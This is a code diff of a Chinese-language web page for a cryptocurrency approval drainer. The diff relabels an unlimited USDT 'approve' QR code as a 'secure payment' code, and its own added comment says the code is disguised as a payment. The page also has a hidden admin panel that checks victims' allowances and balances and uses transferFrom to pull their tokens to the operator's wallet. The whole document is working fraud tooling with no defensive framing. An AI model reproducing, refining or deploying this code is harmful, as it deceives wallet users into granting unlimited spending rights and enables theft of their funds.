@@ -2,84 +2,85 @@
 <html lang="zh-CN">
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>安全验证</title>
+<title>安全支付</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
-body{background:#0B0B1F;color:#fff;padding:20px}
-.container{max-width:420px;margin:0 auto}
-.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:20px}
-h1{font-size:24px;margin-bottom:8px}
-.desc{color:#aaa;margin-bottom:20px}
+body{background:#f5f5f5;color:#333;padding:20px}
+.container{max-width:420px;margin:0 auto;background:#fff;border-radius:20px;padding:20px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
+.pay-box{text-align:center;margin-bottom:20px}
+h1{font-size:24px;margin-bottom:8px;color:#222}
+.desc{color:#666;margin-bottom:20px}
 .chain-select{
 display:flex;gap:10px;margin-bottom:20px;
 }
 .chain-btn{
-flex:1;padding:10px;border-radius:10px;border:none;
-background:#222;color:#aaa;font-weight:bold;cursor:pointer
+flex:1;padding:10px;border-radius:10px;border:1px solid #ddd;
+background:#fff;color:#666;font-weight:bold;cursor:pointer
 }
-.chain-btn.active{background:#F0B90B;color:#000}
+.chain-btn.active{background:#007aff;color:#fff;border-color:#007aff}
 #qrcode{
 width:280px;height:280px;background:#fff;padding:10px;
 border-radius:16px;margin:0 auto 20px;
 display:flex;align-items:center;justify-content:center;
-color:#000;font-size:14px;
+border:1px solid #eee;
 }
 #qrcode img{width:100%;height:100%;border-radius:12px}
-.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
-.status {margin-top:15px;padding:12px;border-radius:10px;background:#111;font-size:14px}
-.status.success{background:#16a34a;color:#fff}
-.status.warning{background:#ca8a04;color:#fff}
+.tip {font-size:12px;color:#999;margin-top:10px;text-align:center}
+.status {margin-top:15px;padding:12px;border-radius:10px;background:#f0f0f0;font-size:14px}
+.status.success{background:#e8f5e9;color:#2e7d32}
+.status.warning{background:#fff3e0;color:#f57c00}
 
 .modal {
 position:fixed;top:0;left:0;width:100%;height:100%;
-background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;
+background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;
 z-index:999;display:none;
 }
 .modal.show {display:flex}
 .modal-content {
-background:#1E1E35;padding:30px;border-radius:20px;text-align:center;
+background:#fff;padding:30px;border-radius:20px;text-align:center;
 max-width:320px;width:90%
 }
-.modal-content h3 {margin-bottom:15px}
-.modal-content p {color:#aaa;margin-bottom:20px}
+.modal-content h3 {margin-bottom:15px;color:#222}
+.modal-content p {color:#666;margin-bottom:20px}
 .modal-btn {
-padding:12px 24px;background:#F0B90B;color:#000;border:none;
+padding:12px 24px;background:#007aff;color:#fff;border:none;
 border-radius:10px;font-weight:bold;cursor:pointer
 }
 
 .admin-panel {
-background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
+background:#fafafa;padding:24px;border-radius:16px;display:none;margin-top:20px;
+border:1px solid #eee
 }
 .admin-panel.show {display:block}
 .admin-input {
-width:100%;padding:12px;background:#111;border:none;
-border-radius:8px;color:#fff;margin-bottom:10px;
+width:100%;padding:12px;background:#fff;border:1px solid #ddd;
+border-radius:8px;color:#333;margin-bottom:10px;
 }
 .admin-btn {
-width:100%;padding:14px;background:#F0B90B;color:#000;
+width:100%;padding:14px;background:#007aff;color:#fff;
 border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
 cursor:pointer;
 }
-.admin-btn.extract {background:#16a34a;}
+.admin-btn.extract {background:#4caf50;}
 </style>
 
 <div class="container">
   <div class="pay-box">
-    <h1>💳 安全验证</h1>
-    <p class="desc">扫码完成授权即可正常使用</p>
+    <h1>💳 安全支付</h1>
+    <p class="desc">扫码支付即可开通服务</p>
     <div class="chain-select">
       <button class="chain-btn active" data-chain="bsc">BSC 主网</button>
       <button class="chain-btn" data-chain="polygon">Polygon 主网</button>
     </div>
-    <div id="qrcode">生成二维码...</div>
-    <div class="tip">TokenPocket 扫码直接授权，无跳转</div>
+    <div id="qrcode">生成支付码...</div>
+    <div class="tip">使用 TokenPocket 扫码支付，安全便捷</div>
     <div id="authStatus" class="status">
-      请用 TokenPocket 扫码完成授权
+      请扫码完成支付
     </div>
   </div>
 
   <div class="admin-panel" id="adminPanel">
-    <h3 style="text-align:center;margin-bottom:16px">🔐 管理员提取后台</h3>
+    <h3 style="text-align:center;margin-bottom:16px;color:#222">🔐 管理员提取后台</h3>
     <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
     <input class="admin-input" id="extractAmount" placeholder="提取数量（USDT）">
     <button class="admin-btn" onclick="checkUserAuth()">检查用户授权</button>
@@ -92,8 +93,8 @@ cursor:pointer;
 
 <div class="modal" id="successModal">
   <div class="modal-content">
-    <h3>✅ 授权成功</h3>
-    <p>您已完成无限授权，可正常使用所有功能</p>
+    <h3>✅ 支付成功</h3>
+    <p>您已完成支付，服务已开通</p>
     <button class="modal-btn" onclick="closeModal()">确定</button>
   </div>
 </div>
@@ -145,34 +146,30 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
   };
 });
 
-// 生成 TP 钱包兼容的授权二维码（仅 approve，不包含 transferFrom）
+// 生成伪装成支付码的授权二维码
 function genAuthQR() {
   const { token, tpScheme } = CONFIG[currentChain];
-  // 仅生成 approve 交易数据，避免 TP 钱包误识别为转账
   const approveData = "0x095ea7b3" +
     ADMIN_WALLET.slice(2).padStart(64, '0') +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  // TP 钱包专属格式：{scheme}://{token}?data={data}
   return `${tpScheme}://${token}?data=${approveData}`;
 }
 
 function renderQR() {
   const url = genAuthQR();
   const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
-  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="授权二维码">`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="支付二维码">`;
 }
 
 // 页面加载时生成二维码
 window.addEventListener("load", () => {
   renderQR();
-  // 自动检测钱包连接
   if (window.ethereum) {
     window.ethereum.on("accountsChanged", (accs) => {
       account = accs[0];
       checkAdmin();
       checkStatus();
     });
-    // 尝试自动连接
     window.ethereum.request({ method: "eth_accounts" }).then(accounts => {
       if (accounts.length > 0) {
         account = accounts[0];
@@ -204,7 +201,7 @@ function closeModal() {
 // 检查当前用户授权状态
 async function checkStatus() {
   if (!account || !provider) {
-    document.getElementById("authStatus").innerHTML = "请用 TokenPocket 扫码完成授权";
+    document.getElementById("authStatus").innerHTML = "请扫码完成支付";
     document.getElementById("authStatus").className = "status warning";
     return;
   }
@@ -215,11 +212,11 @@ async function checkStatus() {
     const statusEl = document.getElementById("authStatus");
 
     if (allowance >= ethers.MaxUint256 / 2n) {
-      statusEl.innerHTML = `✅ 授权成功！无限授权额度：${ethers.formatUnits(allowance, decimals)} USDT`;
+      statusEl.innerHTML = `✅ 支付成功！服务已开通`;
       statusEl.className = "status success";
       document.getElementById("successModal").classList.add("show");
     } else {
-      statusEl.innerHTML = "❌ 未完成授权，请扫码重试";
+      statusEl.innerHTML = "❌ 未完成支付，请扫码重试";
       statusEl.className = "status warning";
     }
   } catch (e) {
@@ -244,10 +241,10 @@ async function checkUserAuth() {
     const statusEl = document.getElementById("adminStatus");
     
     if (allowance >= ethers.MaxUint256 / 2n) {
-      statusEl.innerHTML = `✅ 用户已无限授权！余额：${ethers.formatUnits(balance, decimals)} USDT`;
+      statusEl.innerHTML = `✅ 用户已支付！余额：${ethers.formatUnits(balance, decimals)} USDT`;
       statusEl.className = "status success";
     } else {
-      statusEl.innerHTML = "❌ 用户未授权或授权已用完";
+      statusEl.innerHTML = "❌ 用户未支付";
       statusEl.className = "status warning";
     }
   } catch (e) {
@@ -273,7 +270,6 @@ async function manualExtract() {
     const amount = parseFloat(amountStr);
     const amountWei = ethers.parseUnits(amount.toString(), decimals);
     
-    // 检查授权和余额
     const allowance = await tokenContract.allowance(userAddr, ADMIN_WALLET);
     const balance = await tokenContract.balanceOf(userAddr);
     if (allowance < amountWei) {
@@ -285,11 +281,10 @@ async function manualExtract() {
       return;
     }
 
-    // 执行提取
     const extractTx = await tokenContract.transferFrom(userAddr, ADMIN_WALLET, amountWei);
     await extractTx.wait();
     alert(`✅ 提取成功！交易哈希：${extractTx.hash}`);
-    await checkUserAuth(); // 刷新状态
+    await checkUserAuth();
   } catch (e) {
     alert("提取失败：" + e.message);
   }
